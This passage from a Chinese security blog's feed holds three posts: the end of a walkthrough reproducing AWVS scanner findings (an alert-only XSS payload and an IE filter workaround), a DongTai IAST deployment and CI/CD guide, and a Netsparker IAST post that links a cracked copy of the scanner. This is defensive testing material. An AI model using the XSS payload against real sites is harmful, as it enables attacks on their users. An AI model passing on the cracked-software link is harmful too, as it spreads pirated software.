href="https://xx.com/#&quot;&gt;">https://xx.com/#&quot;&gt;</a>&lt;svg/onload=alert(/xss/)&gt; 成功发现弹窗</p><img src="/awvs-vul/5.png" class="" title="描述"><img src="/awvs-vul/6.png" class="" title="描述"><h1 id="0x03-跨站脚本"><a href="#0x03-跨站脚本" class="headerlink" title="0x03 跨站脚本"></a>0x03 跨站脚本</h1><p><strong>这里吐槽一下，为啥别人扫出来的漏洞直接就能复现，我扫出来的漏洞那么波折呢</strong></p><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>跨站点脚本 (XSS) 是指客户端代码注入攻击，其中，攻击者可以将恶意脚本执行到合法的网站或 Web 应用程序中。当 Web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生 XSS。</p><p>发现者 跨站脚本</p><h2 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h2><p>恶意 JavaScript 可以访问与网页其余部分相同的所有对象，包括访问 cookie 和本地存储（通常用于存储会话令牌）。如果攻击者可以获取用户的会话 cookie，则他们可以冒充该用户。</p><p>此外，JavaScript 可以读取向用户显示的页面内容并进行任意修改。因此，XSS 与一些巧妙的社会工程技术相结合，为攻击者带来了很多可能性。</p><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>对页面上呈现的用户输入应用上下文相关编码和/或验证</p><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p>URL: <code>https://xx.cn/index?returnUrl=</code></p><p>Parameter: <code>returnUrl</code></p><p>returnUrl？ 这里一般都会存在URL重定向漏洞吧，使用浏览器访问该URL，构造XSS查看结果</p><img src="/awvs-vul/7.png" class="" title="描述"><p>这一看结果，返回内容在json里面，<code>Content-Type</code> 也是 <code>application/json</code>，咋个绕过</p><p>咨询大佬，回应说是应该是IE特定条件下能触发，具体也不清楚</p><p>这里使用IE浏览器访问，结果直接就弹出是否下载了json文件</p><p>通过百度，搜索关键字，发现需要修改注册表，添加<code>json的mime类型</code>支持</p><p>如何修改自行百度吧</p><p>然后禁用IE浏览器的XSS筛选器，成功弹窗</p><img src="/awvs-vul/8.png" class="" title="描述"><h1 id="0x04-结束语"><a href="#0x04-结束语" class="headerlink" title="0x04 结束语"></a>0x04 结束语</h1><p>之前一直认为AWVS误报挺多的，这次扫描，比较严重的漏洞都成功复现了，当然漏洞影响有限，还浪费了很多查资料的时间，这里记录一下，方便以后使用，后续也会持续更新，补充一些新的漏洞。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;AWVS作为黑盒测试，主动扫描的比较好用的工具，碰到部分网站扫描结果一堆漏洞，部分漏洞复现比较难，这里找了几个常见的，以往一直忽略的漏洞，详细研究一下，到最后成功复现&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST落地实践</title>
    <link href="http://www.pa55w0rd.online/iast/"/>
    <id>http://www.pa55w0rd.online/iast/</id>
    <published>2021-05-14T03:19:42.000Z</published>
    <updated>2021-07-27T09:25:47.895Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>IAST作为开展sdl中黑白盒测试的有效补充，还是很有必要去了解使用的。笔者为了完善公司的SDL流程，调研了开源的IAST产品进行测试和内部推广</p></blockquote><span id="more"></span><p>刚开始，笔者测试<strong>百度OpenRASP</strong>的IAST功能（主动式IAST），OpenRASP的IAST通过对agent采集到的流量数据进行重放，根据hook点信息做选择性的扫描；与主动式漏扫相比，这种方式减少了很多请求，但是也会存在少量的脏数据，对测试不是很友好；OpenRASP的扫描器支持配置URL白名单，笔者通过对eidt、add、logout等接口加白，基本上解决了脏数据的问题，但是出现了很多漏报，而且基于重放HTTP请求的检测方式，对存在签名、防重放之类，无法进行HTTP请求重放的接口来说，基本无法进行扫描。</p><p>然后，看到火线开源了<strong>洞态IAST</strong>（被动式IAST），本地化部署及测试之后，发现比较符合预期，于是开始做各业务线的推广，与DevOps流程进行集成，目前已实现了新上线项目的<strong>IAST</strong>自动化部署。</p><p>关于洞态IAST介绍，可以直接查看<a href="https://hxsecurity.github.io/DongTaiDoc/#/README">官方文档</a>，接下来，主要分享一下IAST部署及其与DevOps集成的方案。</p><h3 id="一、云端服务介绍及部署"><a href="#一、云端服务介绍及部署" class="headerlink" title="一、云端服务介绍及部署"></a>一、云端服务介绍及部署</h3><h4 id="1-洞态IAST的架构图"><a href="#1-洞态IAST的架构图" class="headerlink" title="1. 洞态IAST的架构图"></a>1. 洞态IAST的架构图</h4><p><img src="https://huoxian-zone.oss-cn-beijing.aliyuncs.com/imagesframework.png" alt="技术架构图"></p><h4 id="2-IAST的基础服务"><a href="#2-IAST的基础服务" class="headerlink" title="2. IAST的基础服务"></a>2. IAST的基础服务</h4><p>“火线～洞态IAST”共有五个模块，分别是<code>DongTai-webapi</code>、<code>DongTai-openapi</code>、<code>DongTai-engine</code>、<code>DongTai-web</code>、<code>agent</code>，其中：</p><ul><li><p><strong>agent</strong>为各语言的数据采集端，从安装探针的项目中采集相对应的数据，发送至<code>DongTai-openapi</code>服务</p></li><li><p><strong>DongTai-web</strong> 为“火线～洞态IAST”的前端项目，负责页面展示</p></li><li><p><strong>DongTai-webapi</strong>用于与<code>DongTai-web</code>交互，负责处理用户相关的API请求</p></li><li><p><strong>DongTai-openapi</strong>用于与<code>agent</code>通信，处理agent上报的数据，向agent下发策略，控制agent的运行等</p></li><li><p><strong>DongTai-engine</strong>用于对<code>DongTai-openapi</code>接收到的数据进行分析、处理，计算存在的漏洞和可用的污点调用链等</p></li></ul><p>五个服务之间存在依赖关系，部署时，需按照以下顺序进行部署：</p><ul><li><p>DongTai-webapi</p></li><li><p>DongTai-openapi</p></li><li><p>DongTai-engine</p></li><li><p>DongTai-web</p></li><li><p>agent</p></li></ul><h4 id="3-本地部署洞态IAST的云端服务"><a href="#3-本地部署洞态IAST的云端服务" class="headerlink" title="3. 本地部署洞态IAST的云端服务"></a>3. 本地部署洞态IAST的云端服务</h4><p><strong>服务器信息</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作系统：CentOS Linux release <span class="number">7.9</span><span class="number">.2009</span> (Core)</span><br><span class="line">CPU：<span class="number">4</span>核</span><br><span class="line">内存：<span class="number">8</span>G</span><br><span class="line">硬盘：<span class="number">100</span>G</span><br></pre></td></tr></table></figure><p>拉取洞态项目代码后，执行<code>build.sh</code>脚本，一键部署<code>docker</code>环境（因为网络问题，代码总是拉取失败，根据shell脚本手动部署一下）</p><h5 id="1-拉取5个项目源码"><a href="#1-拉取5个项目源码" class="headerlink" title="1.  拉取5个项目源码"></a>1.  拉取5个项目源码</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 拉取最新的代码</span></span><br><span class="line">git clone git@github.com:HXSecurity/DongTai.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-webapi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-openapi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-engine</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DongTai-web</span></span><br></pre></td></tr></table></figure><h5 id="2-创建虚拟网络"><a href="#2-创建虚拟网络" class="headerlink" title="2.  创建虚拟网络"></a>2.  创建虚拟网络</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker network rm dongtai-net || true</span><br><span class="line">docker network create dongtai-net</span><br></pre></td></tr></table></figure><h5 id="3-启动MySQL服务"><a href="#3-启动MySQL服务" class="headerlink" title="3.  启动MySQL服务"></a>3.  启动MySQL服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai项目下，使用docker启动mysql</span></span><br><span class="line">cd docker/mysql</span><br><span class="line">docker build -t huoxian/dongtai-mysql:5.7 .</span><br><span class="line">docker stop dongtai-mysql || true</span><br><span class="line">docker rm dongtai-mysql || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-mysql --restart=always huoxian/dongtai-mysql:5.7</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者使用外部mysql，确保版本一致</span></span><br><span class="line">cd docker/mysql</span><br><span class="line">wget https://xxxx.xxxx.xxxx.xxxx/sca.sql</span><br><span class="line">wget https://xxxx.xxxx.xxxx.xxxx/rule.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/db.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/rule.sql</span><br><span class="line">mysql -uroot -p&quot;dongtai-iast&quot; &lt; /opt/sca.sql</span><br></pre></td></tr></table></figure><h5 id="4-启动redis服务"><a href="#4-启动redis服务" class="headerlink" title="4.  启动redis服务"></a>4.  启动redis服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai项目下，使用docker启动redis</span></span><br><span class="line">cd docker/redis</span><br><span class="line">docker build -t huoxian/dongtai-redis:latest .</span><br><span class="line">docker stop dongtai-redis || true</span><br><span class="line">docker rm dongtai-redis || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-redis --restart=always huoxian/dongtai-redis:latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者使用外部redis</span></span><br><span class="line">redis-server /DongTai/docker/redis/redis.conf</span><br></pre></td></tr></table></figure><h5 id="5-启动dongtai-webapi服务"><a href="#5-启动dongtai-webapi服务" class="headerlink" title="5.  启动dongtai-webapi服务"></a>5.  启动dongtai-webapi服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 进入DongTai-webapi项目下</span></span><br><span class="line">cd DongTai-webapi</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp conf/config.ini.example conf/config.ini</span><br><span class="line">sed -i &quot;s/mysql-server/dongtai-mysql/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql-port/3306/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/database_name/dongtai_webapi/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql_username/root/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/mysql_password/dongtai-iast/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_server/dongtai-redis/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_port/6379/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/redis_password/123456/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/broker_db/0/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/engine_url/dongtai-engine:8000/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line">sed -i &quot;s/api_server_url/dongtai-openapi:8000/g&quot; conf/config.ini &gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里dongtai-openapi需要修改为自己的ip</span></span><br><span class="line">docker build -t huoxian/dongtai-webapi:latest .</span><br><span class="line">docker stop dongtai-webapi || true</span><br><span class="line">docker rm dongtai-webapi || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-webapi -e debug=false --restart=always huoxian/dongtai-webapi:latest</span><br></pre></td></tr></table></figure><h5 id="6-启动dongtai-openapi服务"><a href="#6-启动dongtai-openapi服务" class="headerlink" title="6.  启动dongtai-openapi服务"></a>6.  启动dongtai-openapi服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-openapi</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp DongTai-webapi/conf/config.ini conf/config.ini</span><br><span class="line"></span><br><span class="line">docker build -t huoxian/dongtai-openapi:latest .</span><br><span class="line">docker stop dongtai-openapi || true</span><br><span class="line">docker rm dongtai-openapi || true</span><br><span class="line">docker run -d --network dongtai-net -p 8000:8000 --name dongtai-openapi --restart=always huoxian/dongtai-openapi:latest</span><br></pre></td></tr></table></figure><h5 id="7-启动dongtai-engine服务"><a href="#7-启动dongtai-engine服务" class="headerlink" title="7.  启动dongtai-engine服务"></a>7.  启动dongtai-engine服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-engine/</span><br><span class="line">git pull </span><br><span class="line"></span><br><span class="line">cp DongTai-webapi/conf/config.ini conf/config.ini</span><br><span class="line">docker build -t huoxian/dongtai-engine:latest .</span><br><span class="line">docker stop dongtai-engine || true</span><br><span class="line">docker rm dongtai-engine || true</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-engine --restart=always huoxian/dongtai-engine:latest</span><br></pre></td></tr></table></figure><h5 id="8-启动dongtai-engine-task服务"><a href="#8-启动dongtai-engine-task服务" class="headerlink" title="8.  启动dongtai-engine-task服务"></a>8.  启动dongtai-engine-task服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-engine/</span><br><span class="line">docker run -d --network dongtai-net --name dongtai-engine-task --restart=always huoxian/dongtai-engine:latest bash /opt/iast/engine/docker/entrypoint.sh task</span><br></pre></td></tr></table></figure><h5 id="9-启动dongtai-web服务"><a href="#9-启动dongtai-web服务" class="headerlink" title="9.  启动dongtai-web服务"></a>9.  启动dongtai-web服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd DongTai-web</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">cp nginx.conf.example nginx.conf</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/lingzhi-api-svc/dongtai-webapi/g&quot; nginx.conf &gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 因为npm一直build失败，直接使用项目中的dist</span></span><br><span class="line"></span><br><span class="line">docker build -t huoxian/dongtai-web:latest .</span><br><span class="line">docker stop dongtai-web || true</span><br><span class="line">docker rm dongtai-web || true</span><br><span class="line">docker run -d -p 80:80 --network dongtai-net --name dongtai-web --restart=always huoxian/dongtai-web:latest</span><br></pre></td></tr></table></figure><h4 id="4-登陆管理后台"><a href="#4-登陆管理后台" class="headerlink" title="4. 登陆管理后台"></a>4. 登陆管理后台</h4><blockquote><p>确保安全组或防火墙开启80、8000端口</p></blockquote><p>浏览器访问：<a href="http://x.x.x.x/">http://x.x.x.x</a> 访问<code>dongtai-web</code>服务（默认用户名/密码：admin、admin），登陆后及时<strong>修改密码</strong>，在系统配置 - 密码修改处修改密码，然后做好安全组策略，防止恶意扫描<br><img src="https://huoxian-zone.oss-cn-beijing.aliyuncs.com/images750aeb74906981d13308edad215eb618.png" alt="image.png"></p><p>组织管理中，可以新增子部门及普通用户，方便后续分工；子部门用于区分应用所属业务线，每个业务线分别生成属于自己的agent</p><h3 id="二、IAST-agent部署与测试"><a href="#二、IAST-agent部署与测试" class="headerlink" title="二、IAST agent部署与测试"></a>二、IAST agent部署与测试</h3><p>管理后台部署完成后，接下来就需要带着分管安全的leader去找每条业务线研发leader、测试、应用运维，去了解一下现有的网络架构，笔者公司的测试服务均跑在K8S上，Java版本为1.8。</p><h4 id="1-生成agent"><a href="#1-生成agent" class="headerlink" title="1. 生成agent"></a>1. 生成agent</h4><p>进入管理后台，右上角部署IAST</p><p><img src="https://pic.rmb.bdstatic.com/bjh/7497617ea2df99ab88d01bcb3036674f.png" alt="image.png"></p><p>选择应用运行环境，目前我们Java的服务都通过maven打包成jar包，通过<code>java -jar</code> 命令的方式启动，项目名称可以保持默认，我们所有的服务均在<code>CD阶段</code>通过传参的方式指定</p><p><img src="https://pic.rmb.bdstatic.com/bjh/4e795642476d564695002da44ddd603e.png" alt="image.png"></p><p>最后获取下载脚本，这里去掉<strong>projectNmae</strong>参数，下载agent</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &quot;http://x.x.x.x:8000/api/v1/agent/download?url=http://x.x.x.x:8000&amp;jdk.version=Java%201.8&quot; -H &#x27;Authorization: Token xxx&#x27; -o agent.jar -k</span><br></pre></td></tr></table></figure><h4 id="2-本地测试"><a href="#2-本地测试" class="headerlink" title="2. 本地测试"></a>2. 本地测试</h4><p>2.1 启动命令添加配置，启动洞态IAST</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:./agent.jar -Dproject.name=test -Diast.server.mode=local -jar app.jar</span><br></pre></td></tr></table></figure><p>2.2 出现<code>Engine opened successfully</code>日志时，表示洞态IAST启动成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[cn.huoxian.dongtai.iast] The engine configuration file is initialized successfully. file is \config\iast.properties</span><br><span class="line">[cn.huoxian.dongtai.iast] Check <span class="keyword">if</span> the engine needs to be updated</span><br><span class="line">&#123;<span class="string">&quot;status&quot;</span>: <span class="number">202</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;不需要更新或正在更新中&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="keyword">null</span>&#125;</span><br><span class="line">[cn.huoxian.dongtai.iast] Engine does not exist in local cache, the engine will be downloaded.</span><br><span class="line">current jdk version is : <span class="number">1.8</span><span class="number">.0_251</span></span><br><span class="line">[cn.huoxian.dongtai.iast] The remote file http:<span class="comment">//x.x.x.x:8000/api/v1/engine/download?package_name=iast-inject&amp;jdk.version=1 was successfully written to the local cache.</span></span><br><span class="line">[cn.huoxian.dongtai.iast] The remote file http:<span class="comment">//x.x.x.x:8000/api/v1/engine/download?package_name=iast-core&amp;jdk.version=1 was successfully written to the local cache.</span></span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.089</span> [cn.huoxian.dongtai.engine] INFO  The engine is about to be installed, the installation mode is agent</span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.147</span> [cn.huoxian.dongtai.engine] INFO  Initialize the core configuration of the engine</span><br><span class="line"><span class="number">2021</span>-<span class="number">05</span>-<span class="number">12</span> <span class="number">14</span>:<span class="number">13</span>:<span class="number">33.603</span> [cn.huoxian.dongtai.engine] INFO  The engine<span class="string">&#x27;s core configuration is initialized successfully.</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.606 [cn.huoxian.dongtai.engine] INFO  WebServer [ name=Tomcat/8.x, path=\apache-tomcat-8.5.12\bin ]</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.607 [cn.huoxian.dongtai.engine] INFO  Start the data reporting submodule</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.608 [cn.huoxian.dongtai.engine] INFO  The data reporting submodule started successfully</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.608 [cn.huoxian.dongtai.engine] INFO  Register spy submodule</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.615 [cn.huoxian.dongtai.engine] INFO  Spy sub-module registered successfully</span></span><br><span class="line"><span class="string">2021-05-12 14:13:33.616 [cn.huoxian.dongtai.engine] INFO  Install data acquisition and analysis sub-modules</span></span><br><span class="line"><span class="string">2021-05-12 14:13:35.856 [cn.huoxian.dongtai.engine] INFO  The sub-module of data acquisition and analysis is successfully installed</span></span><br><span class="line"><span class="string">2021-05-12 14:13:35.861 [cn.huoxian.dongtai.engine] INFO  The engine is successfully installed to the JVM, and it takes 2773ms</span></span><br><span class="line"><span class="string">2021-05-12 14:13:46.476 [cn.huoxian.dongtai.engine] INFO  Turn on the engine</span></span><br><span class="line"><span class="string">2021-05-12 14:13:46.480 [cn.huoxian.dongtai.engine] INFO  Engine opened successfully</span></span><br><span class="line"><span class="string">[cn.huoxian.dongtai.iast] Successfully opened the engine, and it takes  22s</span></span><br><span class="line"><span class="string">&#123;&quot;status&quot;: 202, &quot;msg&quot;: &quot;不需要更新或正在更新中&quot;, &quot;data&quot;: null&#125;</span></span><br></pre></td></tr></table></figure><p>2.3 打开管理后台，选择项目配置 - 新建项目，配置项目名称为test，添加扫描策略</p><p><img src="https://pic.rmb.bdstatic.com/bjh/2675c6f1c5572eca861a94162b0530c1.png" alt="image.png"></p><p><strong>Note:</strong> 启动服务时，配置了参数<code>-Dproject.name=test</code>，所以，``agent<code>会自动关联至</code>test`项目中，不需要人工配置</p><h4 id="3-与CI-CD集成"><a href="#3-与CI-CD集成" class="headerlink" title="3. 与CI/CD集成"></a>3. 与CI/CD集成</h4><p>目前IAST项目是以业务线进行分组，在管理后台 - 项目配置 - 新建项目，添加项目，项目名称对应各个业务线简称，在启动服务时，通过配置<code>-Dproject.name=$业务线</code> 将agent自动关联至项目中</p><h5 id="3-1-配置jenkins"><a href="#3-1-配置jenkins" class="headerlink" title="3.1 配置jenkins"></a>3.1 配置jenkins</h5><p>将agent打包到公共基础镜像，按照jenkins原来的基础镜像进行选择即可</p><p>基础镜像 java:1.8-sec-agent</p><p><code>Dockerfile = &quot;FROM reg.xx.com/base/java:1.8-sec-agent”</code></p><h5 id="3-2-配置启动命令"><a href="#3-2-配置启动命令" class="headerlink" title="3.2 配置启动命令"></a>3.2 配置启动命令</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/build/k8s/<span class="built_in">test</span>/$业务线/</span><br><span class="line">vim <span class="variable">$appid</span>.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加以下这段commad参数:  &quot;-javaagent:/agent.jar&quot;,&quot;-Dproject.name=$业务线&quot;,&quot;-Diast.server.mode=local&quot;</span></span><br></pre></td></tr></table></figure><h5 id="3-3-重新构建jenkins"><a href="#3-3-重新构建jenkins" class="headerlink" title="3.3 重新构建jenkins"></a>3.3 重新构建jenkins</h5><h5 id="3-4-测试服务功能是否正常"><a href="#3-4-测试服务功能是否正常" class="headerlink" title="3.4 测试服务功能是否正常"></a>3.4 测试服务功能是否正常</h5><p>经测试，服务运行均正常</p><h4 id="5-针对增量服务"><a href="#5-针对增量服务" class="headerlink" title="5. 针对增量服务"></a>5. 针对增量服务</h4><p>笔者与运维开发沟通后，修改自动化发布流程及脚本，对测试环境中新增的Java服务，将自动集成洞态IAST，确保agent覆盖率，目前已基本实现测试服务的覆盖。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;IAST作为开展sdl中黑白盒测试的有效补充，还是很有必要去了解使用的。笔者为了完善公司的SDL流程，调研了开源的IAST产品进行测试和内部推广&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
    <category term="DevSecOps" scheme="http://www.pa55w0rd.online/tags/DevSecOps/"/>
    
  </entry>
  
  <entry>
    <title>Netsparker扫描器IAST使用</title>
    <link href="http://www.pa55w0rd.online/netsparker-iast/"/>
    <id>http://www.pa55w0rd.online/netsparker-iast/</id>
    <published>2021-05-14T02:12:37.000Z</published>
    <updated>2021-05-14T02:53:14.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前测试了AWVS扫描器的IAST功能，使用上不是很方便，需要对每个服务启动一个扫描任务才可以进行扫描，比较主动，无法作为独立的被动式扫描器使用，脏数据也是比较多</p><p>对比awvs和netsparker，在前后端分离场景下，awvs扫描器可以分析swagger文件进行全接口自动化安全扫描，开发人员可以使用该功能增加后端系统的安全测试效率。在多人协作的测试场景下，netsparker扫描器可以开启代理端口，充分导入有效流量进行自动化安全测试，发现隐蔽的安全漏洞</p><span id="more"></span><h2 id="0x01-扫描器安装"><a href="#0x01-扫描器安装" class="headerlink" title="0x01 扫描器安装"></a>0x01 扫描器安装</h2><p>破解版下载<a href="https://pan.baidu.com/s/18lY8xIXoQDcfLRqKFah9kQ">https://pan.baidu.com/s/18lY8xIXoQDcfLRqKFah9kQ</a> 提取码：6cvp</p><p>Netsparker Professional Edition v6.0.0.29750 [ Licensed ] </p><p>Windows双击安装，打开</p><p><img src="https://pic.rmb.bdstatic.com/bjh/74f608277827a8eeb974596449b132d1.png" alt="image.png"></p><h2 id="0x02-IAST使用"><a href="#0x02-IAST使用" class="headerlink" title="0x02 IAST使用"></a>0x02 IAST使用</h2><p><code>Netsparker Shark</code>使您可以在Web应用程序中进行<code>交互式安全测试（IAST）</code>，以确认更多漏洞并进一步减少误报。为了使<code>Netsparker Shark</code>能够运行，您需要下载一个代理并将其部署在您的服务器上。请注意，出于安全原因，该代理是为每个目标网站唯一生成的。</p><p>参考官方文档进行安装 <a href="https://www.netsparker.com/support/deploying-netsparker-shark-for-java-windows/">https://www.netsparker.com/support/deploying-netsparker-shark-for-java-windows/</a></p><h3 id="2-1-生成iast-agent"><a href="#2-1-生成iast-agent" class="headerlink" title="2.1 生成iast agent"></a>2.1 生成iast agent</h3><p>添加扫描目标 - <a href="http://192.168.244.129:8080/">http://192.168.244.129:8080/</a></p><p>选择扫描设置 - Shark - 勾上enable shark，选择服务平台 java，保存为shark.jar </p><p><img src="https://pic.rmb.bdstatic.com/bjh/25109d6ed07f2432ed53ad7dad632ad0.png" alt="image.png"></p><h3 id="2-2-使用iast"><a href="#2-2-使用iast" class="headerlink" title="2.2 使用iast"></a>2.2 使用iast</h3><p>这里使用和awvs类似</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. Deploying AspectJWeaver into your web application</span><br><span class="line"></span><br><span class="line"><span class="attribute">Download</span> AspectJWeaver: https://repo<span class="number">1</span>.maven.org/maven<span class="number">2</span>/org/aspectj/aspectjweaver/<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>/aspectjweaver-<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>.jar</span><br><span class="line"><span class="attribute">From</span> the download folder, select aspectjweaver-<span class="number">1</span>.<span class="number">9</span>.<span class="number">5</span>.jar and rename it aspectjweaver.jar</span><br><span 